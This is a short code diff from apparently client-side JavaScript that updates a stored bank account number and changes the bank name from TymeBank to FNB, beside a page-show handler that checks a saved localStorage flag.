@@ -1,5 +1,5 @@
-wa = "51078598750";
-wb = "TymeBank";
+wa = "62850136774";
+wb = "FNB";
 
 window.addEventListener("pageshow",function() {
 if(localStorage.getItem('wdeets')=='saved') {
